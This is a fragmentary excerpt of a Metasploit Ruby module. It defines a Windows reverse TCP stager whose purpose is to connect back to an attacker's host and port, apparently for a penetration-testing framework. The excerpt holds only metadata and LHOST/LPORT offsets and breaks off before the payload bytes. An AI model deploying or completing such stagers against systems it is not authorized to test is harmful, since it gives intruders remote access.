...
module Metasploit3
	...
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager with Service functions',
			'Version'       => '$Revision: 14774 $',
			'Description'   => 'Connect back to the attacker after SetStatus RUNNING',
			...
			'Stager'        =>
				{
					...
					'Offsets' => { 'LHOST' => [ 197+141, 'ADDR' ], 'LPORT' => [ 204+141, 'n' ], 'ReverseConnectRetries' => [ 195+141, 'C'] },
					'Payload' =>
						# Length: 290 bytes
